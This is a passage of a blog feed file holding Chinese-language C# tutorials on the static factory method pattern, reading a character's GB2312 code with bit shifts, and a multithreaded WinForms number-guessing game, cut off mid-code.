keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Meaw Meaw..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 工厂角色</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 静态工厂</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StaticMultiPetFactory</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> Pet pet <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> Pet <span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> Pet <span class="token function">CreateCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试类</span>    <span class="token keyword">class</span> <span class="token class-name">StaticMultiFactoryMethod</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1、得到商品对象</span>            Pet pet <span class="token operator">=</span> StaticMultiPetFactory<span class="token punctuation">.</span><span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2、使用商品对象</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>pet<span class="token punctuation">.</span><span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="三种工厂方法模式的比较"><a href="#三种工厂方法模式的比较" class="headerlink" title="三种工厂方法模式的比较"></a>三种工厂方法模式的比较</h2><p><strong>相同点</strong>：</p><ul><li>都存在三种角色：(工厂角色、抽象产品角色(抽象类或接口)、具体产品角色)；</li><li>主要是<strong>依靠继承关系</strong>来实现的。</li></ul><p><strong>不同点</strong>：</p><ul><li>普通工厂模式：<strong>工厂</strong>类需要先<strong>实例化</strong>；工厂类中只有一个生产商品的方法且该方法必须指定的相应的<strong>参数</strong>之后才能进行生产；</li><li>多个工厂方法模式：<strong>工厂</strong>类需要先<strong>实例化</strong>；<strong>每一个实体类</strong>在工厂类中<strong>都有一个</strong>生产其对应<strong>实例的方法</strong>，无需额外的参数进行传递；</li><li>静态工厂方法模式：<strong>工厂</strong>类可以<strong>直接使用</strong>；<strong>每一个实体类</strong>在工厂类中<strong>都有一个</strong>生产其对应<strong>实例的方法</strong>，无需额外的参数进行传递。</li></ul><h2 id="优点与缺点"><a href="#优点与缺点" class="headerlink" title="优点与缺点"></a>优点与缺点</h2><p><strong>简单工厂模式</strong>：</p><ul><li>优点：封装对象的创建过程，使之不可见</li><li>缺点:使用工厂类创建对象时，需要传入一个参数才能进行对象的创建   –&gt;多个工厂方法模式(不用传入参数)</li></ul><p><strong>多工厂方法模式</strong>：</p><ul><li>优点：封装对象的创建过程，使之不可见；不用传入参数类创建</li><li>缺点：工厂负荷变大</li></ul><p><strong>静态工厂方法模式</strong>：</p><ul><li>优点：封装对象的创建过程，使之不可见；不用传入参数类创建；不用实例化工厂对象</li><li>缺点：一经启动工厂类中的静态方法就就占据一定量的内存空间       –（慎用）</li></ul><p><strong>致命缺点</strong>：</p><ul><li><font color="red">创建的商品对象<strong>无法访问</strong>到子类对其的<strong>扩展</strong>（使用了多态）。</font></li></ul><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>当需要创建一个类，而在编程时不能确定这个类的类型时（需要运行时确定）</li><li>当一个类希望由其子类来指定所创建对象的具体类型时</li><li>当我们想要定位被创建类，并获取相关消息时</li></ul><h2 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h2><ul><li>日志记录功能（文件日志记录、数据库日志记录、控制台日志记录等）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 工厂方法模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp巧用移位运算符获取汉字编码值</title>
      <link href="/2020/08/22/csharp-qiao-yong-yi-wei-yun-suan-fu-huo-qu-han-zi-bian-ma-zhi/"/>
      <url>/2020/08/22/csharp-qiao-yong-yi-wei-yun-suan-fu-huo-qu-han-zi-bian-ma-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h2><ul><li><p>移位运算符在程序设计中，是<strong>位操作运算符</strong>的一种</p></li><li><p>移位运算符分为<strong>左移位运算符</strong>“&lt;&lt;”和<strong>右移位运算符</strong>“&gt;&gt;”，形如：<strong>X &lt;&lt; N</strong> 或 <strong>X &gt;&gt; N</strong></p></li><li><p>在C#中<strong>X</strong>可以是：int、uint、long、ulong、byte、sbyte、short、ushort，其中<strong>byte、sbyte、short、ushort</strong>类型的值在进行移位操作后的类型将<strong>自动转换成int类型</strong></p></li><li><p>其他类型数据的移位运算其本质还是对<strong>二进制的移位运算</strong></p></li><li><p><span style="color:red">二进制每次向左移1位就相当于乘以2，每次向右移1位就相当于除以2</span></p></li><li><p>举例如下：</p><blockquote><p>问题：</p><ul><li>3(O) &lt;&lt; 2</li></ul><p>计算过程：</p><ol><li>3(O)转换为二进制为:<strong>0011</strong></li><li>二进制数值各个位整体左移两位（<span style="color:red">左端溢出丢弃，右端补”0”</span>）后得到：<strong>1100</strong></li><li>再将移位后的二进制数值转换为十进制数值为：12(O)</li><li>也即：<span style="color:red">3 &lt;&lt; 2 = 12</span></li></ol></blockquote></li></ul><h2 id="汉字编码"><a href="#汉字编码" class="headerlink" title="汉字编码"></a>汉字编码</h2><p>​        汉字编码(Chinese character encoding)是为汉字设计的一种便于输入计算机的代码。</p><h3 id="编码分类"><a href="#编码分类" class="headerlink" title="编码分类"></a>编码分类</h3><p>​        计算机中汉字的表示也是用二进制，根据<strong>应用目的</strong>的不同，汉字编码分为<strong>外码</strong>、<strong>交换码</strong>、<strong>机内码</strong>和<strong>字形码</strong>。</p><h4 id="外码-输入码"><a href="#外码-输入码" class="headerlink" title="外码(输入码)"></a>外码(输入码)</h4><p>​        外码也叫输入码，是用来将汉字输入到计算机中的一组键盘符号。常用的输入码有拼音码、五笔字型码、区位码、电报码等</p><p><strong>特点</strong>：</p><ul><li>编码规则简单</li><li>易学好记</li><li>操作方便</li><li>重码率低</li><li>输入速度快</li></ul><h4 id="交换码-国际码"><a href="#交换码-国际码" class="headerlink" title="交换码(国际码)"></a>交换码(国际码)</h4><p>​        计算机内部处理的信息都是<strong>二进制代码</strong>表示的，汉字也不例外。而二进制代码使用起来很不方便，于是需要采用<strong>信息交换码</strong>。GB2312即为国际码。</p><ul><li><strong>GB2312编码</strong>：1981年5月1日发布的简体中文汉字编码国家标准。GB2312对汉字采用双字节编码，收录7445个图形字符，其中包括6763个汉字。</li><li><strong>BIG5编码</strong>：台湾地区繁体中文标准字符集，采用双字节编码，共收录13053个中文字，1984年实施。</li><li><strong>GBK编码</strong>：1995年12月发布的汉字编码国家标准，是对GB2312编码的扩充，对汉字采用双字节编码。GBK字符集共收录21003个汉字，包含国家标准GB13000-1中的全部中日韩汉字，和BIG5编码中的所有汉字。</li><li><strong>GB18030编码</strong>：2000年3月17日发布的汉字编码国家标准，是对GBK编码的扩充，覆盖中文、日文、朝鲜语和中国少数民族文字，其中收录27484个汉字。GB18030字符集采用单字节、双字节和四字节三种方式对字符编码。兼容GBK和GB2312字符集。</li><li><strong>Unicode编码</strong>：国际标准字符集，它将世界各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台的文本信息转换。</li></ul><h4 id="机内码"><a href="#机内码" class="headerlink" title="机内码"></a>机内码</h4><p>​        根据国际码的规定，每个汉字都有确定的<strong>二进制代码</strong>，在微机内部汉字代码都用机内码，在键盘上记录汉字代码也使用机内码。</p><h4 id="字形码"><a href="#字形码" class="headerlink" title="字形码"></a>字形码</h4><p>​        字形码是汉字的<strong>输出码</strong>，输出汉字时都采用<strong>图形方式</strong>，无论汉字的笔画多少，每个汉字都可以卸载同样大小的<strong>方块</strong>中。通常用16×16点阵来显示汉字。</p><h4 id="地址码"><a href="#地址码" class="headerlink" title="地址码"></a>地址码</h4><p>​        汉字地址码是指汉字库中存<strong>储汉字字形信息的逻辑地址码</strong>。它与汉字机内码有着简单的对应关系，以简单内码到地址码的转换。</p><h3 id="汉字编码之间的关系"><a href="#汉字编码之间的关系" class="headerlink" title="汉字编码之间的关系"></a>汉字编码之间的关系</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp巧用移位运算符获取汉字编码值/汉字编码之间的关系.png" alt="汉字编码之间的关系"></center><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p><strong>编程环境</strong>：</p><ul><li>VS2017</li><li>.Net Framework 4.5</li></ul><p><strong>运行环境</strong>：</p><ul><li>Win10</li></ul><h1 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h1><p><strong>界面设计</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp巧用移位运算符获取汉字编码值/界面.png" alt="界面"></center><p><strong>代码设计</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> GetCode<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btn_Get_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">try</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获得一个汉字字符</span>                <span class="token keyword">char</span> ch <span class="token operator">=</span> txt_ch<span class="token punctuation">.</span>Text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//使用gb2312编码方式获得字节序列</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> gb2312_bt <span class="token operator">=</span> Encoding<span class="token punctuation">.</span><span class="token function">GetEncoding</span><span class="token punctuation">(</span><span class="token string">"gb2312"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> ch <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//将字节序列的第一个字节向左移8位</span>                <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>gb2312_bt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//第一个字节移8位后与第二个字节相加得到汉字编码</span>                n <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>gb2312_bt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示汉字编码(十六进制)</span>                txt_Num<span class="token punctuation">.</span>Text <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//异常提示信息</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请输入汉字字符！"</span><span class="token punctuation">,</span> <span class="token string">"出现错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp巧用移位运算符获取汉字编码值/结果.png" alt="结果"></center><h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><ul><li>char ch = txt_ch.Text[0];<font color="blue">//ch变量存储“位”的Unicode编码</font>&gt;</li><li>byte[] gb2312_bt = Encoding.GetEncoding(“gb2312”).GetBytes(new Char[] { ch });<font color="blue">//gb2312_bt变量数组中存储由ch编码得到的GB2312字节</font></li><li>int n = (int)gb2312_bt[0] &lt;&lt; 8;<font color="blue"> //将字节左移八位(一个字节)</font></li><li>n += (int)gb2312_bt[1];<font color="blue">//两个数值相加得到“位”的GB2312编码(十进制)</font></li><li>txt_Num.Text = Convert.ToString(n, 16);<font color="blue">//编码转十六进制并显示</font></li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><ul><li><a href="https://baike.baidu.com/item/汉字编码/7123465?fr=aladdin" target="_blank" rel="noopener">汉字编码(百度百科)</a></li><li><a href="https://www.qqxiuzi.cn/bianma/zifuji.php" target="_blank" rel="noopener">千千秀字(汉字字符集编码查询)</a></li></ul><p><strong>有关字体编码/查询/加解密网站推荐</strong>：</p><p><a href="https://www.qqxiuzi.cn/daohang.htm" target="_blank" rel="noopener">千千秀字</a></p>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 程序实现 </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp多线程猜数字游戏</title>
      <link href="/2020/08/22/csharp-duo-xian-cheng-cai-shu-zi-you-xi/"/>
      <url>/2020/08/22/csharp-duo-xian-cheng-cai-shu-zi-you-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="程序、进程、线程"><a href="#程序、进程、线程" class="headerlink" title="程序、进程、线程"></a>程序、进程、线程</h2><p><strong>程序</strong>：</p><ul><li>程序是<strong>指令</strong>和<strong>数据</strong>的<strong>有序集合</strong>。</li><li>程序是静态的。</li></ul><p><strong>进程</strong>：</p><ul><li>进程是一段程序的执行过程。</li><li>进程是动态的，具有生命周期。</li><li>进程是一个活动实体。</li><li>进程有三种基本状态（就绪态、运行态、阻塞态）。</li><li>进程是资源分配的基本单位。</li></ul><p><strong>线程</strong>：</p><ul><li>线程作为独立运行和独立调度的基本单位。</li><li>一个进程中可以包含若干个线程。</li></ul><p><strong>多线程</strong>：</p><p>&emsp;&emsp;在一个程序中，这些独立运行的程序片段叫作“线程”（Thread），利用它编程的概念就叫作“多线程处理”。多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。</p><blockquote><p>最简单的比喻多线程就像火车的每一节车厢，而进程则是火车。车厢离开火车是无法跑动的，同理火车也不可能只有一节车厢。多线程的出现就是为了提高效率。<a href="https://www.cnblogs.com/fuchongjundream/p/3829508.html" target="_blank" rel="noopener">“外引”</a></p></blockquote><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p><strong>编程环境</strong>：</p><ul><li>VS2017</li><li>.Net Framework 4.5</li></ul><p><strong>运行环境</strong>：</p><ul><li>Win10</li></ul><h1 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h1><p><strong>界面设计</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp多线程猜数字游戏/设计界面.png" alt="设计界面"></center><p><strong>代码设计</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Drawing<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> NumGame<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Frm_Main</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Frm_Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 声明全局变量</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 定义一个计时器线程</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Thread G_th<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 定义一个随机数对象</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        Random G_random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 定义一个int型全局变量，用于存放产生的随机变量</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token keyword">int</span> G_int_num<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 开始按钮的Click事件</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 开始按钮的Click事件</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btn_begin_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">RemoveControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment" spellcheck="true">//调用自定义的RemoveControl()方法清空自定义的按钮</span>            <span class="token keyword">int</span> p_int_x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">//X坐标初始值为10</span>            <span class="token keyword">int</span> p_int_y <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">//Y坐标初始值为60</span>            <span class="token comment" spellcheck="true">//向窗体添加按钮</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true">//添加100个按钮</span>            <span class="token punctuation">{</span>                Button bt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//创建button按钮</span>                bt<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//设置button按钮的文本值</span>                bt<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//设置button按钮的Name属性</span>                bt<span class="token punctuation">.</span>Width <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//设置button按钮的宽</span>                bt<span class="token punctuation">.</span>Height <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>                                     <span class="token comment" spellcheck="true">//设置button按钮的高</span>                bt<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span>p_int_x<span class="token punctuation">,</span> p_int_y<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//设置button按钮的位置</span>                bt<span class="token punctuation">.</span>Click <span class="token operator">+</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventHandler</span><span class="token punctuation">(</span>bt_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//定义button按钮的Click事件</span>                p_int_x <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//设置下一个按钮的位置</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true">//设定每行有10个按钮</span>                <span class="token punctuation">{</span>                    p_int_x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//换行后重新设置X坐标  --X坐标不变</span>                    p_int_y <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">//换行后重新设置Y坐标  --Y坐标将变化为原来的+距离</span>                <span class="token punctuation">}</span>                Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>bt<span class="token punctuation">)</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//使用Controls.Add()方法将button按钮放入窗体控件集合中</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//创建线程</span>            <span class="token comment" spellcheck="true">//跨线程调用控件</span>            G_th <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Thread</span><span class="token punctuation">(</span>                 <span class="token comment" spellcheck="true">//新建一条线程</span>                <span class="token keyword">delegate</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>                              <span class="token comment" spellcheck="true">//使用匿名方法创建一个委托</span>                <span class="token punctuation">{</span>                    <span class="token keyword">int</span> P_int_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">//初始化计数器</span>                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">true</span><span class="token punctuation">)</span>                                <span class="token comment" spellcheck="true">//开始无限循环</span>                    <span class="token punctuation">{</span>                        P_int_count <span class="token operator">=</span> <span class="token operator">++</span>P_int_count <span class="token operator">></span> <span class="token number">100000000</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token punctuation">:</span> P_int_count<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//计数器累加</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>                            <span class="token comment" spellcheck="true">//将代码交给主线程执行</span>                            <span class="token punctuation">(</span>MethodInvoker<span class="token punctuation">)</span><span class="token keyword">delegate</span>         <span class="token comment" spellcheck="true">//使用匿名方法</span>                            <span class="token punctuation">{</span>                                lb_time<span class="token punctuation">.</span>Text <span class="token operator">=</span> P_int_count<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//窗体中显示计数</span>                            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//线程睡眠1秒</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            G_th<span class="token punctuation">.</span>IsBackground <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//设置线程为后台线程</span>            G_th<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                           <span class="token comment" spellcheck="true">//开始执行线程</span>            <span class="token comment" spellcheck="true">//生成一个随机数</span>            G_int_num <span class="token operator">=</span> G_random<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">//生成一个1-100之间的随机数</span>            btn_begin<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//停用开始按钮</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 注册生成按钮的Click事件的方法</span>        <span class="token comment" spellcheck="true">//注册按钮的Click事件的方法</span>        <span class="token keyword">void</span> <span class="token function">bt_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Control P_control <span class="token operator">=</span> sender <span class="token keyword">as</span> Control<span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">//将sender转换为control类型对象</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>P_control<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">></span> G_int_num<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true">//强制转化并判断猜测数值与随机产生的数值之间的差距</span>            